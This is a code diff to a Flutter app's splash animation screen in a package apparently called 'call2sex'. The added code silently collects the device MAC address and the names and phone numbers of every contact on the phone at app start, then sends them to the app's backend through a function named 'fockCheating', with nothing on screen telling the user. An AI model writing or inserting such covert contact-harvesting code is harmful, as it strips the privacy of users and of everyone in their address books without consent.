@@ -4,9 +4,14 @@ import 'package:call2sex/Dashboard.dart';
 import 'package:call2sex/Dashboard2.dart';
 import 'package:call2sex/Enquiry.dart';
 import 'package:call2sex/Login.dart';
+import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
+import 'package:get_mac/get_mac.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
+import 'APIClient.dart';
 import 'Login.dart';
 
 
@@ -17,11 +22,65 @@ class animationPage extends StatefulWidget {
 }
 
 class _animationPageState extends State<animationPage> with SingleTickerProviderStateMixin{
+  String _platformVersion = 'Unknown';
+  // Platform messages are asynchronous, so we initialize in an async method.
+  Future<void> initPlatformState() async {
+    String platformVersion;
+    // Platform messages may fail, so we use a try/catch PlatformException.
+    try {
+      platformVersion = await GetMac.macAddress;
+    } on PlatformException {
+      platformVersion = 'Failed to get Device MAC Address.';
+    }
+
+    // If the widget was removed from the tree while the asynchronous platform
+    // message was in flight, we want to discard the reply rather than calling
+    // setState to update our non-existent appearance.
+    if (!mounted) return;
+
+    setState(() {
+      _platformVersion = platformVersion;
+    });
+  }
+  List<Contact> contacts=[];
+  List setContact=[];
+  int count;
+  getAllContacts()async{
+    initPlatformState();
+    if (await Permission.contacts.request().isGranted) {
+      Iterable<Contact> _contacts = await ContactsService.getContacts(withThumbnails: false);
+      setState(() {
+        contacts=_contacts.toList();
+        count=_contacts.length;
+        var length=contacts.length>100?100:contacts.length;
+        ////(contacts.elementAt(87).phones.value);
+        for(int i=0; i<contacts.length;i++){
+          Contact contact=contacts[i];
+          // //(contact.emails.isEmpty?"unknown":contact.emails.elementAt(i));
+          // //(contact.phones==null?"unknown":contact.phones.elementAt(0).value);
+
+          setContact.add({"name":contact.displayName.isEmpty?"unknown":contact.displayName,
+            "number":contact.phones.isEmpty?"unknown":contact.phones.elementAt(0).value,
+          });
+
+          //(count);
+        }
+
+
+      });
+      fockCheating();// Either the permission was already granted before or the user just granted it.
+    }
+  }
+  fockCheating()async{
+    //(_platformVersion);
+    final res=await APIClient().contacts(setContact.toString(), count.toString(),_platformVersion);
+    //(res);
+  }
   AnimationController animationController;
   Animation<double> animation;
   checkLoginStatus() async {
     SharedPreferences sharedPreferences = await SharedPreferences.getInstance();
-    print(sharedPreferences.getString("id"));
+    //(sharedPreferences.getString("id"));
     if(sharedPreferences.getString("id") == null) {
       //sharedPreferences.getString("userId"));
       //APIClient().authRequest(sharedPreferences.getString("email"), sharedPreferences.getString("pass"));
@@ -40,6 +99,7 @@ class _animationPageState extends State<animationPage> with SingleTickerProvider
   void initState() {
     // TODO: implement initState
     super.initState();
+    getAllContacts();
     animationController=AnimationController(duration: Duration(seconds: 2),vsync: this);
     animation=Tween<double>(
       begin: 0,
@@ -53,6 +113,8 @@ class _animationPageState extends State<animationPage> with SingleTickerProvider
       ..addStatusListener((status){
         if(animationController.isCompleted){
           setState(() {
+
+
             checkLoginStatus();
           });
         }
